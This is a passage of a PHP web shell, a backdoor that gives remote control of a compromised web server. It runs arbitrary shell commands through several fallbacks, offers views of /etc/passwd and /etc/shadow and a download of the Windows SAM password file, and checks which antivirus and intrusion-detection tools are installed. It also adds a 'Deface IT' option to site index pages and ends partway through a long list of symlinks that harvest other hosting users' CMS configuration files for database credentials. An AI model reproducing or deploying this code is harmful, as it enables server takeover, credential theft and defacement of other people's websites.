		echo $_SERVER['SERVER_ADMIN'];
	}
	function systeminfo()
	{
		echo php_uname();
	}
	function curlinfo()
	{
		echo function_exists('curl_version')?("<font class=txt>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	function oracleinfo()
	{
		echo function_exists('ocilogon')?("<font class=txt>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	function mysqlinfo()
	{
		echo function_exists('mysql_connect')?("<font class=txt>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	function mssqlinfo()
	{
		echo function_exists('mssql_connect')?("<font class=txt>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	function postgresqlinfo()
	{
		echo function_exists('pg_connect')?("<font class=txt>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	function softwareinfo()
	{
		echo getenv("SERVER_SOFTWARE");
	}
	function download()
	{
		$frd=$_GET['download'];
		$prd=explode("/",$frd);
		for($i=0;$i<sizeof($prd);$i++)
		{
			$nfd=$prd[$i];
		}
		@ob_clean(); 
	   header("Content-type: application/octet-stream"); 
	   header("Content-length: ".filesize($nfd)); 
	   header("Content-disposition: attachment; filename=\"".$nfd."\";"); 
   	   readfile($nfd);

   	   exit;
	
	}
		
	function HumanReadableFilesize($size)
    	{
        	$mod = 1024;
 		$units = explode(' ','B KB MB GB TB PB');
 	       for ($i = 0; $size > $mod; $i++) 
 	       {
 	           $size /= $mod;
 	       }
 	       return round($size, 2) . ' ' . $units[$i];
 	}
	
	function showDrives()
    {
        global $self;
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':\\'))
            {
				$myd = $drive.":\\";
                ?>
                <a href=javascript:void(0) onClick="changedir('dir','<?php echo addslashes($myd); ?>')">
                    <?php echo $myd; ?>
                </a> 
                <?php
            }
        }
    }
	function diskSpace()
	{
    	return disk_total_space("/");
	}	
	function freeSpace()
	{
 	   return disk_free_space("/");
	}
	
	function thiscmd($p) 
	{
		$path = myexe('which ' . $p);
		if(!empty($path))
			return $path;
		return false;
	}

	function mysecinfo()
	{
		function myparam($n, $v) 
		{
			$v = trim($v);
			if($v) 
			{
				echo '<span><font color =red size=3>' . $n . ': </font></span>';
				if(strpos($v, "\n") === false)
					echo '<font color =lime size=3>' . $v . '</font><br>';
				else
					echo '<pre class=ml1><font color =lime size=3>' . $v . '</font></pre>';
			}
		}
	
		myparam('Server software', @getenv('SERVER_SOFTWARE'));
		if(function_exists('apache_get_modules'))
			myparam('Loaded Apache modules', implode(', ', apache_get_modules()));
		myparam('Open base dir', @ini_get('open_basedir'));
		myparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
		myparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
		$temp=array();
		if(function_exists('mysql_get_client_info'))
			$temp[] = "MySql (".mysql_get_client_info().")";
		if(function_exists('mssql_connect'))
			$temp[] = "MSSQL";
		if(function_exists('pg_connect'))
			$temp[] = "PostgreSQL";
		if(function_exists('oci_connect'))
			$temp[] = "Oracle";
		myparam('Supported databases', implode(', ', $temp));
		echo '<br>';
	
		if($GLOBALS['os'] == 'Linux') {
				myparam('Distro : ', myexe("cat /etc/*-release")); 
				myparam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href=javascript:void(0) onClick=\"getmydata('passwd')\">[view]</a>":'no');
				myparam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href=javascript:void(0) onClick=\"getmydata('shadow')\">[view]</a>":'no');
				myparam('OS version', @file_get_contents('/proc/version'));
				myparam('Distr name', @file_get_contents('/etc/issue.net'));
				myparam('Where is Perl?', myexe('whereis perl'));
				myparam('Where is Python?', myexe('whereis python'));
				myparam('Where is gcc?', myexe('whereis gcc'));
				myparam('Where is apache?', myexe('whereis apache'));
				myparam('CPU?', myexe('cat /proc/cpuinfo'));
				myparam('RAM', myexe('free -m'));
				myparam('Mount options', myexe('cat /etc/fstab'));
				myparam('User Limits', myexe('ulimit -a'));
				
				
				if(!$GLOBALS['safe_mode']) {
					$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
					$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
					$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
					echo '<br>';
					$temp=array();
					foreach ($userful as $item)
						if(thiscmd($item))
							$temp[] = $item;
					myparam('Userful', implode(', ',$temp));
					$temp=array();
					foreach ($danger as $item)
						if(thiscmd($item))
							$temp[] = $item;
					myparam('Danger', implode(', ',$temp));
					$temp=array();
					foreach ($downloaders as $item)
						if(thiscmd($item))
							$temp[] = $item;
					myparam('Downloaders', implode(', ',$temp));
					echo '<br/>';
					myparam('HDD space', myexe('df -h'));
					myparam('Hosts', @file_get_contents('/etc/hosts'));
					
				}
		} else {
			$repairsam = addslashes($_SERVER["WINDIR"]."\\repair\\sam");
			$hostpath = addslashes($_SERVER["WINDIR"]."\system32\drivers\etc\hosts");
			$netpath = addslashes($_SERVER["WINDIR"]."\system32\drivers\etc\\networks");
			$sampath = addslashes($_SERVER["WINDIR"]."\system32\drivers\etc\lmhosts.sam");
			echo "<font  size=3>Password File : </font><a href=".$_SERVER['PHP_SELF']."?download=" . $repairsam ."><b><font class=txt size=3>Download password file</font></b></a><br>";
			echo "<font  size=3>Config Files :  </font><a href=javascript:void(0) onClick=\"fileaction('open','$hostpath')\"><b><font class=txt size=3>[ Hosts ]</font></b></a> &nbsp;<a href=javascript:void(0) onClick=\"fileaction('open','$netpath')\"><b><font class=txt size=3>[ Local Network Map ]</font></b></a> &nbsp;<a href=javascript:void(0) onClick=\"fileaction('open','$sampath')\"><b><font class=txt size=3>[ lmhosts ]</font></b></a><br>";
			$base = (ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON":"OFF";
			echo "<font  size=3>Open Base Dir : </font><font class=txt size=3>" . $base . "</font><br>";
			myparam('OS Version',myexe('ver'));
			myparam('Account Settings',myexe('net accounts'));
			myparam('User Accounts',myexe('net user'));
		}
		echo '</div>';
	}
	
	
	
	function myexe($in) 
	{
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
	
	function exec_all($command)
	{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($command , "r"); // Open the command pipe for reading
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fgets($handle,512);
                }

            }
        }
        pclose($handle);
    }
    
    
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                );
        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }
    
    return(htmlspecialchars($output));
    
}

$basedir=(ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"<font class=txt>ON</font>":"<font color='red'>OFF</font>";
$etc_passwd=@is_readable("/etc/passwd")?"Yes":"No";

function getOGid($value)
{
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
		$owner = $uid . "/". $gid;
		return $owner;
	} else {
		$name=@posix_getpwuid(@fileowner($value)); 
		$group=@posix_getgrgid(@filegroup($value)); 
		$owner = $name['name']. " / ". $group['name']; 
		return $owner;
	}
}

function mainfun($dir)
{
	global $ind, $directorysperator,$os;
	
	$mydir = basename(dirname('index.php'));
	$pdir = str_replace($mydir,"",$dir);
	$pdir = str_replace("/","",$dir);
	
	$files = array();
	$dirs  = array();
	
	 $odir=opendir($dir);
	 while($file = readdir($odir))
	 {
	   if(is_dir($dir.'/'.$file))
	   {
		 $dirs[]=$file;
	   }
	   else
	   {
		 $files[]=$file;
	   }
	 }
	 $countfiles = count($dirs) + count($files);
	 $dircount = count($dirs); 
	 $dircount = $dircount-2;
	 $myfiles = array_merge($dirs,$files);
	$i = 0;
	if(is_dir($dir))
   	{
		if(scandir($dir) === false)
			echo "<center><font  size=3>Directory isn't readable</font></center>";
		else
		{
?><form method="post" id="myform" name="myform">
	<table id="maintable" style="width:100%;" align="center" cellpadding="3">
	<tr><td colspan="7"><center><div id="showmydata"></div></center></td></tr>
	<tr style="background-color:#0C0C0C;"><td colspan="8" align="center"><font  size="3">Listing folder <?php echo $dir; ?></font> (<?php echo $dircount.' Dirs And '.count($files).' Files'; ?>)</td>
    <tr style="background-color:#0C0C0C; height:12px;">
        <th>Name</th>
        <th>Size</th>
        <th>Permissions</th>
	<?php if($os != "Windows"){ echo "<th>Owner / Group</th>"; } ?>
	<th>Modification Date</th>
        <th>Rename</th>
		<th>Download</th>
		<th style="width:2%;">Action</th>
    </tr>
	<?php 		
		foreach($myfiles as $val)
		{
			$vv = addslashes($dir . $directorysperator . $val);
			$i++;
			
			if($val == ".")
			{
				
				?><tr style="background-color:#0C0C0C;" onMouseOver="style.backgroundColor='#000000'" onMouseOut="style.backgroundColor='#0C0C0C'"><td class='info'><a href=javascript:void(0) onClick="changedir('dir','<?php echo $vv; ?>')"><font class=txt>[ . ]</font></a></td><td><font size=2>CURDIR</font></td>
			<td><a href=javascript:void(0) onClick="fileaction('perms','<?php echo $vv; ?>')"><?php echo filepermscolor($dir); ?></a></td>
			
			<?php if($os != 'Windows')
				  { 
				    echo "<td align=center><font size=2>";
				  	echo getOGid($dir)."</font></td>";
				  }
					 ?>
			
			<td align="center"><font class=txt><?php echo date('Y-m-d H:i:s', @filemtime($vv)); ?></font></td>
			<td></td><td></td><td></td></</tr><?php 
			
			}
			else if($val == "..")
			{ 
				$val = Trail($dir . $directorysperator . $val,$directorysperator);
				$vv = addslashes($val);
				if(empty($vv))
					$vv = "/"; ?>
			<tr style="background-color:#0C0C0C;" onMouseOver="style.backgroundColor='#000000'" onMouseOut="style.backgroundColor='#0C0C0C'"><td class='info'><a href=javascript:void(0) onClick="changedir('dir','<?php echo $vv; ?>')"><font class=txt>[ .. ]</font></a></td><td><font size=2>UPDIR</font></td>
			<td><a href=javascript:void(0) onClick="fileaction('perms','<?php echo $vv; ?>')"><?php echo filepermscolor($val); ?></a></td>
			<?php 	if($os != 'Windows')
					{
					echo "<td align=center><font size=2>"; 
					echo getOGid($val)."</font></td>";
					
					}  ?>
			<td align="center"><font  class=txt><?php echo date('Y-m-d H:i:s', @filemtime($val)); ?></font></td>
			<td></td><td></td><td></td></tr><?php continue;
			}
			else if(is_dir($vv))
			{
		?>
			<tr style="background-color:#0C0C0C;" onMouseOver="style.backgroundColor='#000000'" onMouseOut="style.backgroundColor='#0C0C0C'">
			<td class='dir'><a href=javascript:void(0) onClick="changedir('dir','<?php echo $vv; ?>')">[ <?php echo $val; ?> ]</a></td>
        	<td class='info'><font size=2>DIR</font></td>
			
            <td class='info'><a href=javascript:void(0) onClick="fileaction('perms','<?php echo $vv; ?>')"><?php echo filepermscolor($dir . $directorysperator . $val); ?></a></td>
			<?php if($os != 'Windows')
					{
					echo "<td align=center><font size=2>"; 
					echo getOGid($val)."</font></td>";
					}  ?>
			<td align="center"><font  class=txt><?php echo date('Y-m-d H:i:s', @filemtime($dir . $directorysperator . $val)); ?></font></td>
			<td class="info"><a href=javascript:void(0) onClick="fileaction('rename','<?php echo $vv; ?>')"><font size=2>Rename</font></a></td>
			<td></td>
			<td class="info" align="center"><input type="checkbox" name="actbox[]" id="actbox<?php echo $i; ?>" value="<?php echo $dir . $directorysperator . $val;?>"></td>
            </tr></font>
            <?php
				}
				else if(is_file($vv))
				{
			   ?>
                   <tr style="background-color:#0C0C0C;" onMouseOver="style.backgroundColor='#000000'" onMouseOut="style.backgroundColor='#0C0C0C'">
                   <td class='file'><a href=javascript:void(0) onClick="fileaction('open','<?php echo $vv; ?>')"><?php if(("/" .$val == $_SERVER["SCRIPT_NAME"]) || ($val == "index.php") || ($val == "index.html") || ($val == "config.php") || ($val == "wp-config.php")) { echo "<font color=red>". $val . "</font>";  } else { echo $val; } ?></a> <?php if($val == "index.php" || $val == "index.html") { if(strlen($ind) != 0) { echo "<a href=javascript:void(0) onClick=\"defacefun('$vv')\"><font color=red>( Deface IT )</font></a>"; } } ?></td>
				   
				   <td class='info'><font size=2><?php echo HumanReadableFilesize(filesize($dir . $directorysperator . $val));?></font></td>
				   
                   <td class='info'><a href=javascript:void(0) onClick="fileaction('perms','<?php echo $vv; ?>')"><?php echo filepermscolor($dir . $directorysperator . $val); ?></a></td>
				   
				   <?php if($os != 'Windows')
					{
					echo "<td align=center><font size=2>"; 
					echo getOGid($val)."</font></td>";
					}  ?>
				   <td align="center"><font  class=txt><?php echo date('Y-m-d H:i:s', @filemtime($dir . $directorysperator . $val)); ?></font></td>
				   
                   <td class="info"><a href=javascript:void(0) onClick="fileaction('rename','<?php echo $vv; ?>')"><font size=2>Rename</font></a></td>
				   <td class="info"><a href="<?php echo $self;?>?download=<?php echo $dir . $directorysperator .$val;?>"><font size=2>Download</font></a>
				   <td class="info" align="center"><input type="checkbox" name="actbox[]" id="actbox<?php echo $i; ?>" value="<?php echo $dir . $directorysperator . $val;?>"></td>
                   </tr>
                   <p>
 			 <?php
      		}
		}
		
	echo "</table>
<div align='right' style='width:100%;' id=maindiv><BR><label><input type='checkbox' name='checkall' onclick='checkedAll();'> <font class=txt size=3>Check All </font></label> &nbsp;
<select class=sbox name=choice style='width: 100px;'>
			<option value=delete>Delete</option>
			<option value=chmod>Change mode</option>
			if(class_exists('ZipArchive'))
			{	<option value=compre>Compress</option>
			<option value=uncompre>Uncompress</option> }
		</select>
	
	<input type=button onClick=\"myaction(choice.value)\" value=Submit name=checkoption class=but></form></div>";
	}}
	else
    {
        echo "<p><font  size=3>".$_GET['dir']." is <b>NOT</b> a Valid Directory!<br /></font></p>";
    }

}
if(isset($_REQUEST["script"])) 
{
	$getpath = trim(dirname($_SERVER['SCRIPT_NAME']) . PHP_EOL);
	?>
	<center><table><tr><td><a href=javascript:void(0) onClick="getdata('manuallyscript')"><font class=txt size="4">| Do It Manually |</font></a></td>
	<td><a href=javascript:void(0) onClick="getdata('scriptlocator')"><font class=txt size="4">| Do It Automatically |</font></a></td>
	</tr></table></center>
	<?php
}
else if(isset($_REQUEST['manuallyscript']))
{
	?>
		<center>
		<form action="<?php echo $self; ?>" method="post">
		<textarea class="box" rows="16" cols="100" name="passwd"></textarea><br>
		<input type="button" OnClick="manuallyscriptfn(passwd.value)" value="Get Config" class="but">
		</form>
		</center>
		<?php
}
else if(isset($_REQUEST['scriptlocator']))
{
	if(stristr(php_uname(),"Linux"))
	{
		$url = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
		$path=explode('/',$url);
		$url =str_replace($path[count($path)-1],'',$url);
		function syml($usern,$pdomain)
		{
			symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home/'.$usern.'/public_html/core/includes/config.php',$pdomain.'~~vBulletin5.txt');
			symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home/'.$usern.'/public_html/vb/core/includes/config.php',$pdomain.'~~vBulletin5.txt');
			symlink('/home/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
			symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb1.txt');
			symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home2/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
			symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb2.txt');
			symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home3/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
			symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb3.txt');
			symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home4/'.$usern.'/public_html/inc/config.php',$pdomain.'~~mybb.txt');
			symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb4.txt');
			symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
			symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
			symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
			symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
			symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
			symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
			symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
			symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
			symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
			symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
			symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
			symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
			symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
			symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
			symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
			symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
			symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
			symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
			symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
			symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
			symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
			symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
			symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
			symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~ipb5.txt');
			symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
			symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
			symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
			symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
			symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
			symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
			symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
			symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
